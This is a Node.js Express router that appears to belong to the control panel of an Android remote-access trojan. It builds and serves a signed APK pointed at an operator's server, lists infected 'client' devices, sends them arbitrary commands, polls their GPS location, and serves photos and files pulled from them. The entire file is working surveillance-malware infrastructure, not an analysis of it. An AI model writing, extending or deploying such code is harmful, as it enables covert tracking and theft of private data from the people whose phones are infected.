const express = require('express');
const crypto = require('crypto');
const path = require('path');
const fs = require('fs');
const config = require('./config');
const db = require('./db');
const clients = require('./clients');
const { logger, getLogs, clearLogs, getStats } = require('./logs');
const builder = require('./builder');

const router = express.Router();

// Auth middleware
function auth(req, res, next) {
    try {
        const token = db.main.get('admin.token').value();
        if (req.cookies?.token === token && token) {
            next();
        } else {
            res.redirect('/login');
        }
    } catch (e) {
        logger.systemError('Auth middleware failed', e);
        res.redirect('/login');
    }
}

// Request logging middleware
function logRequest(req, res, next) {
    const start = Date.now();
    res.on('finish', () => {
        const duration = Date.now() - start;
        const status = res.statusCode >= 400 ? 'error' : 'success';
        if (req.path !== '/builder/progress') { // Skip progress polling
            logger.info(`${req.method} ${req.path} - ${res.statusCode} (${duration}ms)`, 'system');
        }
    });
    next();
}

router.use(logRequest);

// Login
router.get('/login', (req, res) => {
    res.render('login');
});

router.post('/login', express.urlencoded({ extended: true }), (req, res) => {
    try {
        const { user, pass } = req.body;
        const admin = db.main.get('admin').value();
        const hash = crypto.createHash('md5').update(pass || '').digest('hex');
        
        const ip = req.ip || req.connection.remoteAddress;
        
        if (user === admin.user && hash === admin.pass) {
            const token = crypto.randomBytes(16).toString('hex');
            db.main.get('admin').assign({ token }).write();
            logger.loginSuccess(ip);
            res.cookie('token', token).redirect('/');
        } else {
            logger.loginFailed(ip);
            res.redirect('/login?error=1');
        }
    } catch (e) {
        logger.systemError('Login failed', e);
        res.redirect('/login?error=1');
    }
});

router.get('/logout', (req, res) => {
    try {
        const ip = req.ip || req.connection.remoteAddress;
        db.main.get('admin').assign({ token: '' }).write();
        logger.logout(ip);
        res.clearCookie('token').redirect('/login');
    } catch (e) {
        logger.systemError('Logout failed', e);
        res.redirect('/login');
    }
});

// Dashboard
router.get('/', auth, (req, res) => {
    try {
        res.render('index', { 
            online: clients.online(), 
            offline: clients.offline() 
        });
    } catch (e) {
        logger.systemError('Dashboard render failed', e);
        res.status(500).send('Internal error');
    }
});

// Builder
router.get('/builder', auth, (req, res) => {
    res.render('builder');
});

router.post('/builder', auth, (req, res) => {
    try {
        const { serverUrl, homePageUrl } = req.body;
        
        if (!serverUrl) {
            logger.warning('Build attempted without server URL', 'build');
            return res.json({ error: 'Server URL is required' });
        }
        
        logger.buildStart(serverUrl);
        
        builder.buildApk(serverUrl, homePageUrl, (err) => {
            if (err) {
                logger.buildFailed(err);
                res.json({ error: err });
            } else {
                logger.buildSuccess(serverUrl);
                res.json({ success: true });
            }
        });
    } catch (e) {
        logger.systemError('Builder route failed', e);
        res.json({ error: e.message });
    }
});

router.get('/builder/progress', auth, (req, res) => {
    try {
        res.json({ progress: builder.getProgress() });
    } catch (e) {
        res.json({ progress: { step: 'error', message: 'Failed to get progress' } });
    }
});

// Logs
router.get('/logs', auth, (req, res) => {
    try {
        const { type, category, search, limit } = req.query;
        const logs = getLogs({ 
            type, 
            category, 
            search, 
            limit: limit ? parseInt(limit) : 100 
        });
        const stats = getStats();
        res.render('logs', { logs, stats, filters: { type, category, search } });
    } catch (e) {
        logger.systemError('Logs render failed', e);
        res.status(500).send('Internal error');
    }
});

router.post('/logs/clear', auth, (req, res) => {
    try {
        clearLogs();
        res.json({ success: true });
    } catch (e) {
        logger.systemError('Clear logs failed', e);
        res.json({ error: e.message });
    }
});

// API: Get log stats
router.get('/api/logs/stats', auth, (req, res) => {
    try {
        res.json(getStats());
    } catch (e) {
        res.json({ error: e.message });
    }
});

// Device management
router.get('/device/:id', auth, (req, res) => {
    res.redirect(`/device/${req.params.id}/info`);
});

router.get('/device/:id/:page', auth, (req, res) => {
    try {
        const { id, page } = req.params;
        const data = clients.getData(id, page);
        
        if (data) {
            res.render('device', { id, page, data });
        } else {
            res.render('device', { id, page: 'notfound', data: {} });
        }
    } catch (e) {
        logger.systemError('Device page render failed', e);
        res.status(500).send('Internal error');
    }
});

// Commands
router.post('/cmd/:id/:cmd', auth, express.json(), (req, res) => {
    try {
        const { id, cmd } = req.params;
        const params = { ...req.query, ...req.body };
        
        clients.send(id, cmd, params, (err, msg) => {
            if (err) {
                res.json({ error: err });
            } else {
                res.json({ success: true, message: msg });
            }
        });
    } catch (e) {
        logger.systemError('Command route failed', e);
        res.json({ error: e.message });
    }
});

// GPS polling
router.post('/gps/:id/:interval', auth, (req, res) => {
    try {
        const { id, interval } = req.params;
        clients.setGps(id, parseInt(interval) || 0);
        res.json({ success: true });
    } catch (e) {
        logger.systemError('GPS route failed', e);
        res.json({ error: e.message });
    }
});

// Static downloads
router.use('/downloads', express.static(config.downloadsPath));
router.use('/photos', express.static(config.photosPath));

// Serve signed APK
router.get('/build.s.apk', (req, res) => {
    try {
        if (fs.existsSync(builder.signedApk)) {
            logger.info('APK downloaded', 'build');
            res.download(builder.signedApk);
        } else {
            logger.warning('APK requested but not found', 'build');
            res.status(404).send('APK not found. Build one first using the Builder page.');
        }
    } catch (e) {
        logger.systemError('APK download failed', e);
        res.status(500).send('Internal error');
    }
});

// API: Get client list
router.get('/api/clients', auth, (req, res) => {
    try {
        res.json({
            online: clients.online(),
            offline: clients.offline(),
            total: clients.all().length
        });
    } catch (e) {
        res.json({ error: e.message });
    }
});

// API: Get client info
router.get('/api/client/:id', auth, (req, res) => {
    try {
        const client = clients.get(req.params.id);
        if (client) {
            res.json(client);
        } else {
            res.json({ error: 'Client not found' });
        }
    } catch (e) {
        res.json({ error: e.message });
    }
});

// Error handler
router.use((err, req, res, next) => {
    logger.systemError('Unhandled route error', err);
    res.status(500).json({ error: 'Internal server error' });
});

module.exports = router;
